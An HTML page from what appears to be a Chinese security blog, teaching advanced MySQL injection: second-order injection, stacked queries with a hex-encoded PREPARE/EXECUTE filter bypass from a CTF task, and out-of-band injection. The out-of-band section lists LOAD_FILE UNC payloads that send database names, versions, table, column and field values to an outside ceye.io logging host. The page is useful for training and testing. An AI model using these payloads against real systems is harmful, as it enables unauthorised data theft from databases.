@@ -1,0 +1,415 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <link rel="stylesheet" href="/css/custom.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MySQL进阶：二次注入、堆叠注入与带外</title>
+    <meta charset="utf-8">
+    <meta name="description" content="Ladder@MySQL进阶：二次注入、堆叠注入与带外 - Hzhsrc home">
+    <meta name="author" content="hzhsec">
+    <link rel="canonical" href="http://118.178.86.67/list/base_bug/sql%E6%B3%A8%E5%85%A5/sql4/">
+
+    <link rel="alternate" type="application/rss+xml" href="http://118.178.86.67//index.xml" title="Hzhsrc home">
+
+    
+
+
+    <meta property="og:title" content="MySQL进阶：二次注入、堆叠注入与带外" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://118.178.86.67/list/base_bug/sql%E6%B3%A8%E5%85%A5/sql4/" /><meta property="article:section" content="list" />
+<meta property="article:published_time" content="2024-04-24T15:40:00+08:00" />
+<meta property="article:modified_time" content="2024-04-24T15:40:00+08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="MySQL进阶：二次注入、堆叠注入与带外"/>
+<meta name="twitter:description" content=""/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "目录",
+      "item": "http://118.178.86.67/list/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "基础漏洞",
+      "item": "http://118.178.86.67/list/base_bug/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  4 ,
+      "name": "MySQL进阶：二次注入、堆叠注入与带外",
+      "item": "http://118.178.86.67/list/base_bug/sql%E6%B3%A8%E5%85%A5/sql4/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "MySQL进阶：二次注入、堆叠注入与带外",
+  "name": "MySQL进阶：二次注入、堆叠注入与带外",
+  "description": "",
+  "keywords": [
+    "二次注入", "堆叠注入", "带外注入", "DNSLOG"
+  ],
+  "articleBody": " 概述 本篇记录二次注入、堆叠注入（stacked queries）与带外注入（out-of-band, OOB）三类进阶注入技术的思路、触发条件与常见 DEMO。适合在有一定 SQL 注入基础后用于实战与题型训练（如 CTF）。\n一、二次注入（Second-order Injection） 1. 基本概念 二次注入是指攻击者先把恶意内容写入应用（如注册、保存、修改操作），该数据并不立即触发注入；当应用在后续流程（例如 select 或 update）处再次使用这些已存数据进行 SQL 拼接时才触发注入。\n2. 常见场景 用户注册、个人信息填写、评论、简历等“写入后使用”的功能点。 CMS 的个人中心、简历功能（例如 74CMS 的个人简历）等。 3. 判定思路 黑盒：查找具有写入并后续展示/处理的数据流（功能点） 白盒：查找 INSERT 后进入 SELECT 或 UPDATE 的代码路径 4. 注入条件 插入时存在转义或自动处理（使插入数据可带单引号），且后续对插入数据再次拼接执行 SQL（SELECT/UPDATE） 若插入阶段对单引号做了转义（例如使用魔法函数或框架转义），后续再次拼接时可能导致转义不当或二次解析，从而触发二次注入。\n二、堆叠注入（Stacked Queries） 1. 概念 堆叠注入通过结束符（如 ;）在一个请求中执行多条 SQL 语句，前提是后端或驱动支持多语句执行（例如 PHP 的 mysqli_multi_query()）。\n2. 触发条件 目标存在 SQL 注入点； 未对 ; 等分隔符进行过滤； 后端使用支持多语句的接口（如 mysqli_multi_query）或驱动允许多语句； 数据库本身支持多语句（MySQL、MSSQL、PostgreSQL 等通常支持）。 3. CTF / 题型示例（强网题） 常见利用：\n'; SHOW DATABASES; '; SHOW TABLES; '; SHOW COLUMNS FROM `1919810931114514`; '; SELECT flag FROM `1919810931114514`; 当常规字符串被过滤（例如 select 被过滤）时，可以将语句转换为十六进制并用变量执行绕过：\n'; SET @a=0x73656c65637420666c61672066726f6d20603139313938313039333131313435313460; PREPARE execsql FROM @a; EXECUTE execsql; 三、带外注入（Out-of-Band Injection, OOB）与 DNSLOG 1. 概念与适用场景 带外注入用于无回显且无法通过延时或布尔注入获取数据的场景。该方法利用数据库或主机执行外联（如 DNS 请求或 SMB 请求）触发外部平台记录，达到数据泄露的目的。\n2. 基本条件 通常需要较高权限（如 root）或启用相关函数（如 LOAD_FILE()、xp_cmdshell() 等）； 存在能发起外部请求的函数或能力； 能使用外部平台（DNSLOG、CEYE 等）接收回连结果。 3. 常用平台 http://ceye.io（需注册并使用 token） http://www.dnslog.cn（国内常用 DNSLOG 服务） 4. 常见 payload（使用 LOAD_FILE 利用 SMB/UNC 回连或 DNS 查询） -- 使用 UNC 路径触发外联（Windows 风格） SELECT LOAD_FILE(CONCAT('\\\\\\\\', (SELECT DATABASE()), '.your-identifier.ceye.io\\\\abc')); -- MySQL 示例，查询当前数据库名并通过 UNC 回连 id=1 AND LOAD_FILE(CONCAT('\\\\\\\\', DATABASE(), '.dbuh8a.ceye.io\\\\asdt')) -- 查询信息_schema 中的库名（用 LIMIT 控制回显序号） id=1 AND LOAD_FILE(CONCAT('\\\\\\\\', (SELECT schema_name FROM information_schema.schemata LIMIT 0,1), '.dbuh8a.ceye.io\\\\xxx.txt')) -- 查询版本号 id=1 AND LOAD_FILE(CONCAT('\\\\\\\\', VERSION(), '.dbuh8a.ceye.io\\\\xxx.txt')) -- 查询某库的第一个表名 id=1 AND LOAD_FILE(CONCAT('\\\\\\\\', (SELECT table_name FROM information_schema.tables WHERE table_schema='demo01' LIMIT 0,1), '.dbuh8a.ceye.io\\\\xxx.txt')) -- 查询列名 id=1 AND LOAD_FILE(CONCAT('\\\\\\\\', (SELECT column_name FROM information_schema.columns WHERE table_schema='security' AND table_name='emails' LIMIT 0,1), '.dbuh8a.ceye.io\\\\xxx.txt')) -- 查询字段值（示例：security.emails.id 第一个值） id=1 AND LOAD_FILE(CONCAT('\\\\\\\\', (SELECT id FROM security.emails LIMIT 0,1), '.dbuh8a.ceye.io\\\\xxx.txt')) 说明：\n带外方法通常只能每次回显一个字段或一小段信息，需借助 LIMIT、SUBSTR 等逐步枚举； 有时 LOAD_FILE 受 secure-file-priv 或读取权限限制，无法直接读取本地文件，但可利用 UNC/SMB 回连触发外部日志。 四、小结 二次注入更隐蔽，重点在找到“写入-读取/处理”链路； 堆叠注入依赖后端是否允许多语句执行，适用于能执行多条 SQL 的场景； 带外注入是解决无回显环境的强力手段，但依赖外部平台与主机能发起网络请求的能力； 在实战中注意合规与授权范围，避免危害目标系统。 参考 CTF 题解与强网杯 writeup ",
+  "wordCount" : "239",
+  "inLanguage": "en",
+  "datePublished": "2024-04-24T15:40:00+08:00",
+  "dateModified": "2024-04-24T15:40:00+08:00",
+  "author":{
+    "@type": "Person",
+    "name": "hzhsec"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://118.178.86.67/list/base_bug/sql%E6%B3%A8%E5%85%A5/sql4/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Hzhsrc home",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://118.178.86.67/favicon.ico"
+    }
+  }
+}
+</script>
+    <link rel="icon" href="/images/hzhsec.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/hzhsec.png">
+
+<link rel="manifest" href="/images/hzhsec.png">
+    
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lxgw-wenkai-webfont@1.7.0/style.css" />
+
+    
+    
+    <link rel="stylesheet" href="/css/main.min.ec28f09e946fc0df77c187fcd0d0ebde58fca6de8efb8e1620f3d45c32d4da88.css" integrity="sha256-7CjwnpRvwN93wYf80NDr3lj8pt6O&#43;44WIPPUXDLU2og=" crossorigin="anonymous" media="screen" />
+
+    
+    <link rel="stylesheet" href="/scss/highlight/github-dark.min.min.66034289ee9a113219a2c4aae0a8bd2095ab255c832a42efcf5863f10814e7a1.css" />
+
+    
+    <script src="/js/highlight.min.min.c098d85b5396dec4707ea2cead1445b4dc2ff0fc56b8dbbd9049d0d1c50ad237.js"></script>
+    <script>hljs.highlightAll();</script>
+
+    <script>(()=>{var t=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,e=localStorage.getItem("theme");t&&e===null&&(localStorage.setItem("theme","dark"),document.documentElement.setAttribute("data-dark-mode","")),t&&e==="dark"&&document.documentElement.setAttribute("data-dark-mode",""),e==="dark"&&document.documentElement.setAttribute("data-dark-mode","")})()</script>
+    </head>
+<body>
+      <main class="wrapper"><nav class="navigation">
+    <section class="container">
+        <a class="navigation-brand" href="/">
+            主页
+        </a>
+        <input type="checkbox" id="menu-toggle" />
+        <label class="menu-button float-right" for="menu-toggle">
+            <span></span><span></span><span></span>
+        </label>
+        
+        <ul class="navigation-list" id="navigation-list">
+            
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/list/">目录</a>
+            </li>
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/archives/">归档</a>
+            </li>
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/message/">关于</a>
+            </li>
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/categories/">分类</a>
+            </li>
+            
+            
+
+            <li class="navigation-item menu-separator">
+                <span>|</span>
+            </li>
+
+            
+            
+            <li class="navigation-item navigation-social">
+                <a class="navigation-link" href="https://github.com/hzhsec">    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+         stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-github">
+      <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+    </svg>
+    </a>
+            </li>
+            
+            <li class="navigation-item navigation-social">
+                <a class="navigation-link" href="/message/">    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+         stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-mail">
+      <path d="M4 4h16v16H4z"></path><polyline points="4,4 12,12 20,4"></polyline>
+    </svg>
+    </a>
+            </li>
+            
+            
+
+            <li class="navigation-item navigation-dark">
+                <button id="mode" type="button" aria-label="toggle user light or dark theme">
+                    <span class="toggle-dark">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                             stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-moon">
+                            <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                        </svg>
+                    </span>
+                    <span class="toggle-light">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                             stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-sun">
+                            <circle cx="12" cy="12" r="5"></circle>
+                            <line x1="12" y1="1" x2="12" y2="3"></line>
+                            <line x1="12" y1="21" x2="12" y2="23"></line>
+                            <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                            <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                            <line x1="1" y1="12" x2="3" y2="12"></line>
+                            <line x1="21" y1="12" x2="23" y2="12"></line>
+                            <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                            <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                        </svg>
+                    </span>
+                </button>
+            </li>
+            
+        </ul>
+        
+    </section>
+</nav>
+
+<div id="content">
+<article class="blog-single">
+  <header class="blog-title">
+    <h1>MySQL进阶：二次注入、堆叠注入与带外</h1>
+  </header>
+
+  <p>
+  <small>
+    April 24, 2024&nbsp;· 239 words&nbsp;· 2 min</small>
+
+  
+<p>
+
+  <div class="blog-toc">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-基本概念">1. 基本概念</a></li>
+    <li><a href="#2-常见场景">2. 常见场景</a></li>
+    <li><a href="#3-判定思路">3. 判定思路</a></li>
+    <li><a href="#4-注入条件">4. 注入条件</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#1-概念">1. 概念</a></li>
+    <li><a href="#2-触发条件">2. 触发条件</a></li>
+    <li><a href="#3-ctf--题型示例强网题">3. CTF / 题型示例（强网题）</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#1-概念与适用场景">1. 概念与适用场景</a></li>
+    <li><a href="#2-基本条件">2. 基本条件</a></li>
+    <li><a href="#3-常用平台">3. 常用平台</a></li>
+    <li><a href="#4-常见-payload使用-load_file-利用-smbunc-回连或-dns-查询">4. 常见 payload（使用 <code>LOAD_FILE</code> 利用 SMB/UNC 回连或 DNS 查询）</a></li>
+  </ul>
+</nav>
+  </div>
+
+  <section class="blog-content"><!-- 建议路径： content/漏洞复现/php-mysql-advanced-injection.md -->
+<h1 id="概述">概述</h1>
+<p>本篇记录二次注入、堆叠注入（stacked queries）与带外注入（out-of-band, OOB）三类进阶注入技术的思路、触发条件与常见 DEMO。适合在有一定 SQL 注入基础后用于实战与题型训练（如 CTF）。</p>
+<hr>
+<h1 id="一二次注入second-order-injection">一、二次注入（Second-order Injection）</h1>
+<h2 id="1-基本概念">1. 基本概念</h2>
+<p>二次注入是指<strong>攻击者先把恶意内容写入应用（如注册、保存、修改操作），该数据并不立即触发注入；当应用在后续流程（例如 select 或 update）处再次使用这些已存数据进行 SQL 拼接时才触发注入</strong>。</p>
+<h2 id="2-常见场景">2. 常见场景</h2>
+<ul>
+<li>用户注册、个人信息填写、评论、简历等“写入后使用”的功能点。</li>
+<li>CMS 的个人中心、简历功能（例如 74CMS 的个人简历）等。</li>
+</ul>
+<h2 id="3-判定思路">3. 判定思路</h2>
+<ul>
+<li>黑盒：查找具有写入并后续展示/处理的数据流（功能点）</li>
+<li>白盒：查找 <code>INSERT</code> 后进入 <code>SELECT</code> 或 <code>UPDATE</code> 的代码路径</li>
+</ul>
+<h2 id="4-注入条件">4. 注入条件</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>插入时存在转义或自动处理（使插入数据可带单引号），且后续对插入数据再次拼接执行 SQL（SELECT/UPDATE）
+</span></span></code></pre></div><p>若插入阶段对单引号做了转义（例如使用魔法函数或框架转义），后续再次拼接时可能导致转义不当或二次解析，从而触发二次注入。</p>
+<hr>
+<h1 id="二堆叠注入stacked-queries">二、堆叠注入（Stacked Queries）</h1>
+<h2 id="1-概念">1. 概念</h2>
+<p>堆叠注入通过结束符（如 <code>;</code>）在一个请求中执行多条 SQL 语句，前提是后端或驱动支持多语句执行（例如 PHP 的 <code>mysqli_multi_query()</code>）。</p>
+<h2 id="2-触发条件">2. 触发条件</h2>
+<ol>
+<li>目标存在 SQL 注入点；</li>
+<li>未对 <code>;</code> 等分隔符进行过滤；</li>
+<li>后端使用支持多语句的接口（如 <code>mysqli_multi_query</code>）或驱动允许多语句；</li>
+<li>数据库本身支持多语句（MySQL、MSSQL、PostgreSQL 等通常支持）。</li>
+</ol>
+<h2 id="3-ctf--题型示例强网题">3. CTF / 题型示例（强网题）</h2>
+<p>常见利用：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>&#39;; SHOW DATABASES;
+</span></span><span style="display:flex;"><span>&#39;; SHOW TABLES;
+</span></span><span style="display:flex;"><span>&#39;; SHOW COLUMNS FROM `1919810931114514`;
+</span></span><span style="display:flex;"><span>&#39;; SELECT flag FROM `1919810931114514`;
+</span></span></code></pre></div><p>当常规字符串被过滤（例如 <code>select</code> 被过滤）时，可以将语句转换为十六进制并用变量执行绕过：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>&#39;; SET @a=0x73656c65637420666c61672066726f6d20603139313938313039333131313435313460; PREPARE execsql FROM @a; EXECUTE execsql;
+</span></span></code></pre></div><hr>
+<h1 id="三带外注入out-of-band-injection-oob与-dnslog">三、带外注入（Out-of-Band Injection, OOB）与 DNSLOG</h1>
+<h2 id="1-概念与适用场景">1. 概念与适用场景</h2>
+<p>带外注入用于<strong>无回显且无法通过延时或布尔注入获取数据</strong>的场景。该方法利用数据库或主机执行外联（如 DNS 请求或 SMB 请求）触发外部平台记录，达到数据泄露的目的。</p>
+<h2 id="2-基本条件">2. 基本条件</h2>
+<ul>
+<li>通常需要较高权限（如 <code>root</code>）或启用相关函数（如 <code>LOAD_FILE()</code>、<code>xp_cmdshell()</code> 等）；</li>
+<li>存在能发起外部请求的函数或能力；</li>
+<li>能使用外部平台（DNSLOG、CEYE 等）接收回连结果。</li>
+</ul>
+<h2 id="3-常用平台">3. 常用平台</h2>
+<ul>
+<li><code>http://ceye.io</code>（需注册并使用 token）</li>
+<li><code>http://www.dnslog.cn</code>（国内常用 DNSLOG 服务）</li>
+</ul>
+<h2 id="4-常见-payload使用-load_file-利用-smbunc-回连或-dns-查询">4. 常见 payload（使用 <code>LOAD_FILE</code> 利用 SMB/UNC 回连或 DNS 查询）</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#75715e">-- 使用 UNC 路径触发外联（Windows 风格）
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">SELECT</span> LOAD_FILE(CONCAT(<span style="color:#e6db74">&#39;\\\\&#39;</span>, (<span style="color:#66d9ef">SELECT</span> <span style="color:#66d9ef">DATABASE</span>()), <span style="color:#e6db74">&#39;.your-identifier.ceye.io\\abc&#39;</span>));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">-- MySQL 示例，查询当前数据库名并通过 UNC 回连
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">AND</span> LOAD_FILE(CONCAT(<span style="color:#e6db74">&#39;\\\\&#39;</span>, <span style="color:#66d9ef">DATABASE</span>(), <span style="color:#e6db74">&#39;.dbuh8a.ceye.io\\asdt&#39;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">-- 查询信息_schema 中的库名（用 LIMIT 控制回显序号）
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">AND</span> LOAD_FILE(CONCAT(<span style="color:#e6db74">&#39;\\\\&#39;</span>, (<span style="color:#66d9ef">SELECT</span> <span style="color:#66d9ef">schema_name</span> <span style="color:#66d9ef">FROM</span> information_schema.schemata <span style="color:#66d9ef">LIMIT</span> <span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>), <span style="color:#e6db74">&#39;.dbuh8a.ceye.io\\xxx.txt&#39;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">-- 查询版本号
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">AND</span> LOAD_FILE(CONCAT(<span style="color:#e6db74">&#39;\\\\&#39;</span>, <span style="color:#66d9ef">VERSION</span>(), <span style="color:#e6db74">&#39;.dbuh8a.ceye.io\\xxx.txt&#39;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">-- 查询某库的第一个表名
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">AND</span> LOAD_FILE(CONCAT(<span style="color:#e6db74">&#39;\\\\&#39;</span>, (<span style="color:#66d9ef">SELECT</span> <span style="color:#66d9ef">table_name</span> <span style="color:#66d9ef">FROM</span> information_schema.tables <span style="color:#66d9ef">WHERE</span> table_schema<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;demo01&#39;</span> <span style="color:#66d9ef">LIMIT</span> <span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>), <span style="color:#e6db74">&#39;.dbuh8a.ceye.io\\xxx.txt&#39;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">-- 查询列名
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">AND</span> LOAD_FILE(CONCAT(<span style="color:#e6db74">&#39;\\\\&#39;</span>, (<span style="color:#66d9ef">SELECT</span> <span style="color:#66d9ef">column_name</span> <span style="color:#66d9ef">FROM</span> information_schema.columns <span style="color:#66d9ef">WHERE</span> table_schema<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;security&#39;</span> <span style="color:#66d9ef">AND</span> <span style="color:#66d9ef">table_name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;emails&#39;</span> <span style="color:#66d9ef">LIMIT</span> <span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>), <span style="color:#e6db74">&#39;.dbuh8a.ceye.io\\xxx.txt&#39;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">-- 查询字段值（示例：security.emails.id 第一个值）
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">AND</span> LOAD_FILE(CONCAT(<span style="color:#e6db74">&#39;\\\\&#39;</span>, (<span style="color:#66d9ef">SELECT</span> id <span style="color:#66d9ef">FROM</span> <span style="color:#66d9ef">security</span>.emails <span style="color:#66d9ef">LIMIT</span> <span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>), <span style="color:#e6db74">&#39;.dbuh8a.ceye.io\\xxx.txt&#39;</span>))
+</span></span></code></pre></div><p><strong>说明</strong>：</p>
+<ul>
+<li>带外方法通常只能每次回显一个字段或一小段信息，需借助 <code>LIMIT</code>、<code>SUBSTR</code> 等逐步枚举；</li>
+<li>有时 <code>LOAD_FILE</code> 受 <code>secure-file-priv</code> 或读取权限限制，无法直接读取本地文件，但可利用 UNC/SMB 回连触发外部日志。</li>
+</ul>
+<hr>
+<h1 id="四小结">四、小结</h1>
+<ul>
+<li>二次注入更隐蔽，重点在找到“写入-读取/处理”链路；</li>
+<li>堆叠注入依赖后端是否允许多语句执行，适用于能执行多条 SQL 的场景；</li>
+<li>带外注入是解决无回显环境的强力手段，但依赖外部平台与主机能发起网络请求的能力；</li>
+<li>在实战中注意合规与授权范围，避免危害目标系统。</li>
+</ul>
+<hr>
+<h1 id="参考">参考</h1>
+<ul>
+<li>CTF 题解与强网杯 writeup</li>
+</ul></section>
+
+  
+  
+  <div class="paginator">
+    
+    <a class="prev" href="http://118.178.86.67/list/base_bug/%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E/up4/">
+      <svg class="icon" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M3.77086 21.1546C11.0491 22.698 21.4339 21.7773 21.4339 16.3608V4.63375C21.4339 3.93962 21.3581 3.30535 21.1917 2.76787M3.77086 21.1546C1.9934 20.7777 0.973585 18.7264 1.08749 16.688C1.2668 13.479 1.15721 9.43135 1.00513 6.21507C0.87809 3.52811 3.12891 1.16316 5.51029 1.25008C9.76594 1.40542 15.377 1.20229 18.7912 1.00542C20.0864 0.930734 20.8406 1.63385 21.1917 2.76787M3.77086 21.1546C4.56586 21.4723 5.49168 21.7879 6.5 22.0658M21.1917 2.76787C23.1097 4.18217 23.13 12.4191 22.9004 16.3608C20.8478 24.0194 12.3061 23.6662 6.5 22.0658M21.1917 2.76787C21.7612 4.51192 22.7203 9.67216 22 16.3608C21.2797 23.0494 11.3665 22.9511 6.5 22.0658M9.94496 9C9.28897 9.61644 7.63215 10.997 6.04814 11.7966C5.98257 11.8297 5.98456 11.9753 6.05061 12.0063C7.05496 12.4779 8.92941 13.9264 9.94496 15M6.44444 11.9667C8.86549 12.0608 14 12 16 11" stroke="currentColor" stroke-linecap="round"/>
+      </svg>
+      <span>文件安全：下载与删除、目录安全：遍历与穿越</span></a>
+    
+    
+    <a class="next" href="http://118.178.86.67/list/base_bug/%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E/up5/"><span>CTF：文件上传（ctf.show）题目整理 - 上传 Payload构造</span>
+      <svg class="icon" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M3.77086 21.1546C11.0491 22.698 21.4339 21.7773 21.4339 16.3608V4.63375C21.4339 3.93962 21.3581 3.30535 21.1917 2.76787M3.77086 21.1546C1.9934 20.7777 0.973585 18.7264 1.08749 16.688C1.2668 13.479 1.15721 9.43135 1.00513 6.21507C0.87809 3.52811 3.12891 1.16316 5.51029 1.25008C9.76594 1.40542 15.377 1.20229 18.7912 1.00542C20.0864 0.930734 20.8406 1.63385 21.1917 2.76787M3.77086 21.1546C4.56586 21.4723 5.49168 21.7879 6.5 22.0658M21.1917 2.76787C23.1097 4.18217 23.13 12.4191 22.9004 16.3608C20.8478 24.0194 12.3061 23.6662 6.5 22.0658M21.1917 2.76787C21.7612 4.51192 22.7203 9.67216 22 16.3608C21.2797 23.0494 11.3665 22.9511 6.5 22.0658M12.055 9C12.711 9.61644 14.3679 10.997 15.9519 11.7966C16.0174 11.8297 16.0154 11.9753 15.9494 12.0063C14.945 12.4779 13.0706 13.9264 12.055 15M15.5556 11.9667C13.1345 12.0608 8 12 6 11" stroke="currentColor" stroke-linecap="round"/>
+      </svg>
+    </a>
+    
+  </div>
+  
+
+  
+
+
+</article>
+
+        </div><footer class="footer">
+  <p>&copy; 2025 <a href="http://118.178.86.67/">Hzhsrc home</a>
+    Powered by
+    <a href="https://gohugo.io/" rel="noopener" target="_blank">Hugo️️</a>
+    <a href="https://github.com/guangzhengli/hugo-theme-ladder" rel="noopener" target="_blank">Ladder</a>
+️  </p>
+</footer>
+
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M10.5376 22.7916C11.0152 22.7207 22.5795 21.1781 22.0978 10.4211C22.0536 9.43274 21.9303 8.53367 21.7387 7.71865M10.5376 22.7916C16.876 22.3728 20.0969 19.8899 21.5383 16.9142M10.5376 22.7916C9.7707 22.9055 8.97982 22.8964 8.19743 22.7725M21.7387 7.71865C21.4988 6.69828 21.1518 5.80967 20.7188 5.04257M21.7387 7.71865C22.6022 10.1105 23.0542 13.7848 21.5383 16.9142M20.7188 5.04257C17.1684 -1.24629 7.83127 0.632493 4.27577 5.04257C2.88063 6.77451 -0.0433281 11.1668 1.38159 16.6571C2.27481 20.0988 5.17269 22.2936 8.19743 22.7725M20.7188 5.04257C22.0697 6.9404 24.0299 11.3848 22.3541 15.4153M21.5383 16.9142C21.8737 16.4251 22.1428 15.9235 22.3541 15.4153M8.19743 22.7725C12.1971 23.4683 20.6281 22.971 22.3541 15.4153M14 10.945C13.3836 10.289 12.003 8.63215 11.2034 7.04814C11.1703 6.98257 11.0247 6.98456 10.9937 7.05061C10.5221 8.05496 9.07362 9.92941 8 10.945M11.0333 7.44444C10.9392 9.86549 11 15 12 17" stroke="currentColor" stroke-linecap="round"/>
+    </svg>
+</a>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'Copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'Copied';
+            setTimeout(() => {
+                copybutton.innerHTML = 'Copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+        codeblock.parentNode.appendChild(copybutton);
+    });
+</script></main>
+    </body>
+  
